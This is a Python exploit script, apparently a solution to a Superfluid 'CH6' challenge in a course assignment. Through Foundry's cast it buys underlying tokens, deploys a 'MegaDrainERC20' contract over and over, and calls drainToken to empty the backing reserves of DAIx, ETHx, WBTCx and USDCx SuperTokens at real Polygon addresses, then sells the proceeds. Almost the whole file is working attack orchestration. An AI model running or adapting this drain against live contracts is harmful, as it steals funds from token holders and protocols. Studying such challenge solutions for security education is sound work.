#!/usr/bin/env python3
"""
CH6 ERC20 SuperToken drain — buy underlying, deploy MegaDrainERC20, drain, sell.
"""
import subprocess, json, os, time, sys

from dotenv import load_dotenv
load_dotenv("/Users/dldustn/Desktop/AssignmentC/.env")

RPC = os.environ["RPC_CH6_SUPERFLUID_V21"]
PK = os.environ["PRIVATE_KEY"]
ATK = os.environ["PUBLIC_ADDRESS"]

HOST = "0x3E14dC1b13c488a8d5D310918780c983bD5982E7"
IDA = "0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1"
ROUTER = "0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff"
WMATIC = "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270"

TOKENS = [
    ("DAIx",  "0x1305F6B6Df9Dc47159D12Eb7aC2804d4A33173c2", "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063", 18),
    ("ETHx",  "0x27e1e4E6BC79D93032abef01025811B7E4727e85", "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619", 18),
    ("WBTCx", "0x4086eBf75233e8492F1BCDa41C7f2A8288c2fB92", "0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6", 8),
    ("USDCx", "0xCAa7349CEA390F89641fe306D93591f87595dc1F", "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", 6),
]

def run_cmd(cmd, timeout=120):
    return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)

def get_balance(addr):
    r = run_cmd(["cast", "balance", addr, "--rpc-url", RPC], 30)
    return int(r.stdout.strip())

def get_erc20(token, addr):
    r = run_cmd(["cast", "call", "--rpc-url", RPC, token, "balanceOf(address)(uint256)", addr], 30)
    try:
        return int(r.stdout.strip().split()[0])
    except:
        return 0

def cast_send(to, sig, args=None, value=None, gas_limit=None, timeout=300):
    cmd = ["cast", "send", "--private-key", PK, "--rpc-url", RPC]
    if gas_limit:
        cmd += ["--gas-limit", str(gas_limit)]
    if value:
        cmd += ["--value", str(value)]
    cmd += [to, sig]
    if args:
        cmd += [str(a) for a in args]
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    if r.returncode != 0:
        print(f"  ERR: {r.stderr.strip()[:300]}", flush=True)
        return False
    return True

def deploy_mega_erc20():
    artifact = "/Users/dldustn/Desktop/AssignmentC/challenges/ch6_superfluid_v21/out/MegaDrain.sol/MegaDrainERC20.json"
    with open(artifact) as f:
        bc = json.load(f)["bytecode"]["object"]
    cmd = ["cast", "send", "--private-key", PK, "--rpc-url", RPC, "--create", bc, "--json"]
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
    if r.returncode != 0:
        print(f"  DEPLOY ERR: {r.stderr[:200]}", flush=True)
        return None
    try:
        return json.loads(r.stdout)["contractAddress"]
    except:
        return None

def buy_underlying(underlying, matic_amount):
    deadline = 99999999999
    return cast_send(ROUTER, "swapExactETHForTokens(uint256,address[],address,uint256)",
                     [0, f"[{WMATIC},{underlying}]", ATK, deadline],
                     value=matic_amount)

def sell_underlying(underlying, amount):
    cast_send(underlying, "approve(address,uint256)", [ROUTER, str(amount)])
    deadline = 99999999999
    cast_send(ROUTER, "swapExactTokensForETH(uint256,uint256,address[],address,uint256)",
              [amount, 0, f"[{underlying},{WMATIC}]", ATK, deadline])

def drain_erc20_token(name, super_token, underlying, decimals):
    backing = get_erc20(underlying, super_token)
    print(f"\n=== DRAIN {name} === backing={backing}", flush=True)
    if backing == 0:
        print(f"{name} already drained!", flush=True)
        return

    scale_factor = 10 ** (18 - decimals)
    idx_base = {"DAIx": 800000000, "ETHx": 810000000, "WBTCx": 820000000, "USDCx": 830000000}[name]

    for cycle in range(20):
        backing = get_erc20(underlying, super_token)
        if backing == 0:
            print(f"{name} FULLY DRAINED!", flush=True)
            break

        our_underlying = get_erc20(underlying, ATK)
        print(f"  Cycle {cycle}: backing={backing}, our_underlying={our_underlying}", flush=True)

        # Buy underlying if we don't have enough
        need = backing // 10 * 3  # need backing/10 (for reentry=10), buy 3x for safety
        if need == 0:
            need = 1
        if our_underlying < need:
            buy_amount = min(get_balance(ATK) // 5, get_balance(ATK) - 2 * 10**18)
            if buy_amount <= 0:
                print("  Not enough MATIC to buy underlying!", flush=True)
                break
            print(f"  Buying underlying with {buy_amount} MATIC...", flush=True)
            buy_underlying(underlying, buy_amount)
            our_underlying = get_erc20(underlying, ATK)
            print(f"  Got {our_underlying} underlying", flush=True)

        # Deploy fresh MegaDrainERC20
        mega = deploy_mega_erc20()
        if not mega:
            continue
        print(f"  MegaDrain: {mega}", flush=True)

        # Approve + transfer underlying to MegaDrain
        send_amount = min(our_underlying, backing // 5)  # enough for 2x drain
        if send_amount == 0:
            send_amount = our_underlying
        cast_send(underlying, "approve(address,uint256)", [mega, str(send_amount)])
        cast_send(underlying, "transfer(address,uint256)", [mega, str(send_amount)])

        # Call drainToken
        idx = idx_base + cycle * 100
        print(f"  Draining idx={idx}...", flush=True)
        if not cast_send(mega, "drainToken(address,address,uint256,uint32)",
                        [super_token, underlying, scale_factor, idx],
                        gas_limit="15000000", timeout=600):
            print(f"  DrainToken failed!", flush=True)
            continue

        new_backing = get_erc20(underlying, super_token)
        drained = backing - new_backing
        print(f"  Drained: {drained}, new_backing={new_backing}", flush=True)

    # Sell remaining underlying
    remaining = get_erc20(underlying, ATK)
    if remaining > 0:
        print(f"  Selling {remaining} remaining underlying...", flush=True)
        sell_underlying(underlying, remaining)

def main():
    print("=== CH6 ERC20 SuperToken Drain ===", flush=True)
    print(f"Our MATIC: {get_balance(ATK)}", flush=True)

    for name, super_token, underlying, decimals in TOKENS:
        drain_erc20_token(name, super_token, underlying, decimals)

    print(f"\n=== FINAL VERIFICATION ===", flush=True)
    for name, super_token, underlying, decimals in TOKENS:
        backing = get_erc20(underlying, super_token)
        print(f"{name}: backing={backing}", flush=True)
    print(f"Our MATIC: {get_balance(ATK)}", flush=True)

if __name__ == "__main__":
    main()
